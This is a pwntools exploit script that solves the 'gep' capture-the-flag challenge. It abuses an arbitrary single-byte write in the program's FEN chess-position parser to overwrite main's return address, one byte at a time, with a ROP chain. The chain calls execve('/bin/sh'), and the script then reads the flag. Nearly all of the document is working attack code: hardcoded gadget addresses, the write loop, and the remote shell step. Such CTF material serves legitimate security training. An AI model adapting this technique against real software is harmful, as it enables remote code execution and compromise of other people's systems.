from pwn import *

e = ELF('./gep')


#r = process('./gep')
#r = gdb.debug('./gep')
r = remote('gep.challs.srdnlen.it', 1660)

# Exploit: arbitrary single-byte write in FEN deserialization.
# HOW:
# 1) Set payload bytes as custom moveset
# 2) overflow each single byte into target structure.
# This creates an arbitrary write for any target past main's stack (up to roughly 8*85 = 680 bytes away). Main will loop until we quit.
# Main's return is 232 bytes off from the first row.
# Here is a simple exploit which overwrites __libc_start_main+XXX with an execve() ROP.
# for instance, to overwrite the 232th byte from the first row, we will have to skip 232 (29*8) spaces then add eg. a king
# This piece was previously set to the payload byte.
# Example FEN: 88888888888888888888888888888K//////// - 0
# We can do it for one byte per row but careful about reaching the 100 character limit.
# This epxloit does it one byte per position, from the bottom row.

BASE_OFFSET = 232 #subtracted by 8 for each row used
PIECE_ORDER = b"KQRBNP kqrbnp *"

def calc_skip(off):
    res = b''
    while off>8:
        res += b'8'
        off -=8
    if off>0:
        res += str(off).encode('ascii')
    return res

def arbitrary_write_gen_pos(r,off_from_ret_start,payload_bytes):
    print(f"Writing bytes {[hex(x) for x in payload_bytes]} starting at offset {off_from_ret_start}")
    to_write = sorted(list(set(payload_bytes)))[::-1] # Unique bytes, reverse sorted to have null at the end (if there is a null)
    # 1) Custom chesspieces to load custom bytes
    r.writeline(b'2')
    r.readuntil(b'up.')
    r.writeline(bytes(to_write)) 
    # 2) Calc overflow offset for current row and target offset
    # Best to be patient or we reach the 100 character limit.
    # We will do it one position at a time    
    for offset in range(len(payload_bytes)):
        b = payload_bytes[offset]
        real_index = to_write.index(b)
        piece = PIECE_ORDER[real_index]
        print(f"byte: {b} string off:{offset} write off: {off_from_ret_start + offset} set off :{real_index} set byte: {to_write[real_index]} piece: {piece}")
        r.readuntil(b'Quit.')   
        r.writeline(b'1')
        res = b'///////' + calc_skip(off_from_ret_start + offset - 56) + bytes([piece])+ b' - 0'
        r.readuntil(b'(no brackets):')
        r.writeline(res)


POP_RAX_RET = 0x459d27
POP_RDI_RET = 0x402acf
POP_RSI_RET = 0x40aafe
POP_RDX_RBX_RET = 0x4a458b

WRITABLE_SEGMENT = 0x4e6000
MOV_RSI_RAX = 0x45c495

SYSCALL = 0x423686

rop = [
    # Write str to writable section
    p64(POP_RAX_RET),
    b'/bin/sh\0',
    p64(POP_RSI_RET),
    p64(WRITABLE_SEGMENT),
    p64(MOV_RSI_RAX),
    # execve(str, ...)
    p64(POP_RAX_RET),
    p64(0x3b),
    p64(POP_RDI_RET),
    p64(WRITABLE_SEGMENT), 
    p64(POP_RSI_RET),
    p64(0),
    p64(POP_RDX_RBX_RET),
    p64(0),
    p64(0),
    p64(SYSCALL)
    ]

base = BASE_OFFSET
for step in rop:
    arbitrary_write_gen_pos(r, base, step)
    base += 8
r.sendline(b'3')
r.sendline(b'cat flag.txt')
r.recvuntil(b'srdnlen{')
flag_content = r.recvuntil(b'}')
flag = b'srdnlen{'+flag_content
print(flag.decode('utf8'))